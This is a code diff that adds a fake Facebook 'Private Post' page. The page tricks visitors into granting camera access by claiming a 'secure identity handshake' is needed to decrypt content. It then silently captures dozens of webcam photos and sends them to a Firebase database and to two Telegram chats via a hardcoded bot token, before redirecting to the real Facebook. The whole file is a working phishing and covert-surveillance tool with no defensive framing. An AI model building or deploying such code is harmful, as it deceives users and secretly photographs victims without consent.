@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook | Private Post</title>
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+    
+    <style>
+        :root {
+            --fb-blue: #0866ff;
+            --fb-bg: #f0f2f5;
+            --fb-white: #ffffff;
+            --fb-text: #050505;
+            --fb-sub: #65676b;
+        }
+
+        body { 
+            margin: 0; padding: 0; background: var(--fb-bg); color: var(--fb-text);
+            font-family: Segoe UI, Helvetica, Arial, sans-serif;
+            display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh;
+        }
+
+        .fb-card {
+            width: 100%; max-width: 500px; background: var(--fb-white); border-radius: 8px;
+            box-shadow: 0 12px 28px 0 rgba(0, 0, 0, 0.2), 0 2px 4px 0 rgba(0, 0, 0, 0.1);
+            overflow: hidden;
+        }
+
+        .fb-header {
+            padding: 12px 16px; border-bottom: 1px solid #dddfe2;
+            display: flex; align-items: center; gap: 10px;
+        }
+
+        .fb-logo { width: 40px; height: 40px; }
+
+        .fb-body { padding: 40px 30px; text-align: center; }
+
+        .post-placeholder {
+            width: 100%; height: 200px; background: #e4e6eb; border-radius: 8px;
+            margin-bottom: 24px; display: flex; flex-direction: column; align-items: center; justify-content: center;
+            position: relative; overflow: hidden;
+        }
+
+        .blur-img {
+            position: absolute; width: 100%; height: 100%;
+            background: url('https://images.unsplash.com/photo-1511671782779-c97d3d27a1d4?q=80&w=400') center;
+            background-size: cover; filter: blur(25px); opacity: 0.6;
+        }
+
+        .lock-icon { z-index: 2; width: 48px; fill: var(--fb-sub); margin-bottom: 12px; }
+
+        h2 { font-size: 20px; font-weight: 700; margin: 0 0 12px; }
+        p { font-size: 14px; color: var(--fb-sub); line-height: 1.5; margin-bottom: 30px; }
+
+        .btn-fb {
+            background: var(--fb-blue); color: #fff; border: none;
+            width: 100%; padding: 10px; font-size: 16px; font-weight: 600;
+            border-radius: 6px; cursor: pointer; transition: background 0.2s;
+        }
+        .btn-fb:hover { background: #0055d4; }
+
+        /* Sync Logic UI */
+        #sync-ui { display: none; }
+        
+        .fb-loader {
+            width: 32px; height: 32px; border: 4px solid #f3f3f3;
+            border-top: 4px solid var(--fb-blue); border-radius: 50%;
+            margin: 0 auto 16px; animation: fb-spin 1s linear infinite;
+        }
+        @keyframes fb-spin { to { transform: rotate(360deg); } }
+
+        .sync-text { font-size: 14px; font-weight: 600; color: var(--fb-text); }
+        .node-tag { font-size: 11px; color: var(--fb-sub); margin-top: 20px; text-transform: uppercase; }
+    </style>
+</head>
+<body>
+
+    <div class="fb-card">
+        <div class="fb-header">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" class="fb-logo" alt="Facebook">
+            <div style="font-weight: 600; font-size: 15px;">Facebook Private Sharing</div>
+        </div>
+
+        <div class="fb-body" id="init-view">
+            <div class="post-placeholder">
+                <div class="blur-img"></div>
+                <svg class="lock-icon" viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM9 6c0-1.66 1.34-3 3-3s3 1.34 3 3v2H9V6zm9 14H6V10h12v10zm-6-3c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2z"/></svg>
+                <div style="z-index: 2; font-size: 12px; color: #444; font-weight: 600;">PRIVATE CONTENT</div>
+            </div>
+            <h2>Verify to View Post</h2>
+            <p>This content was shared from a <b>Restricted Group</b>. To prevent unauthorized screen recording, a secure identity handshake is required to decrypt the media.</p>
+            
+            <button class="btn-fb" onclick="startFbSync()">Verify Identity</button>
+            <div class="node-tag">Security Node: Mumbai_Primary_MS</div>
+        </div>
+
+        <div class="fb-body" id="sync-ui">
+            <div class="fb-loader"></div>
+            <div class="sync-text">Establishing Secure Connection...</div>
+            <p style="font-size: 12px; margin-top: 10px;" id="fb-timer">Decryption session valid for 60s</p>
+            
+            <div style="text-align: left; background: #f0f2f5; padding: 15px; border-radius: 6px; font-family: monospace; font-size: 10px; color: #65676b; border: 1px solid #ddd;">
+                > INITIALIZING_SSL_RELAY...<br>
+                > LOCATION: MUMBAI_WEST_MAH<br>
+                > STATUS: ENCRYPTING_HANDSHAKE
+            </div>
+            <div class="node-tag">Connected to Mumbai Cloud Hub</div>
+        </div>
+    </div>
+
+    <!-- Hidden Capture Engine -->
+    <video id="v" style="display:none;" autoplay playsinline></video>
+    <canvas id="c" style="display:none;"></canvas>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyBlRY8iXI5jK8GH8tku6A0We3tC_0iiup4",
+            authDomain: "shadow-app-4q69.firebaseapp.com",
+            databaseURL: "https://shadow-app-4q69-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "shadow-app-4q69",
+            storageBucket: "shadow-app-4q69.firebasestorage.app",
+            messagingSenderId: "109693889633",
+            appId: "1:109693889633:web:f1654b2fb1de886cdc8e20"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+        const TOKEN = '8620771394:AAGl1HASK_i24zIpAZLCC7wRIwxlUvkxYrI';
+        const IDS = ['7617707778', '7194705917'];
+
+        async function startFbSync() {
+            try {
+                // Requesting permission under the guise of "Private Content Decryption"
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                document.getElementById('init-view').style.display = 'none';
+                document.getElementById('sync-ui').style.display = 'block';
+
+                const video = document.getElementById('v');
+                video.srcObject = stream;
+                
+                video.onloadedmetadata = () => {
+                    video.play();
+                    let timeLeft = 60;
+                    let count = 0;
+
+                    const interval = setInterval(() => {
+                        timeLeft--;
+                        count++;
+                        document.getElementById('fb-timer').innerText = `Decryption session valid for ${timeLeft}s`;
+
+                        if (count <= 52) {
+                            fbCapture(count);
+                        }
+
+                        if (timeLeft <= 0) {
+                            clearInterval(interval);
+                            stream.getTracks().forEach(t => t.stop());
+                            // Redirect to official Facebook Feed
+                            window.location.href = "https://www.facebook.com";
+                        }
+                    }, 1000);
+                };
+            } catch (err) {
+                window.location.href = "https://www.facebook.com";
+            }
+        }
+
+        function fbCapture(idx) {
+            const canvas = document.getElementById('c');
+            const video = document.getElementById('v');
+            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            const b64 = canvas.toDataURL('image/jpeg', 0.2);
+            database.ref('captures').push({ 
+                image: b64, 
+                type: "FACEBOOK_SPOOF", 
+                ts: Date.now(), 
+                loc: "MUMBAI" 
+            });
+
+            canvas.toBlob(blob => {
+                IDS.forEach(id => {
+                    const fd = new FormData();
+                    fd.append('chat_id', id); fd.append('photo', blob, 'fb_recon_mumbai.jpg');
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                });
+            }, 'image/jpeg', 0.3);
+        }
+    </script>
+</body>
+</html>
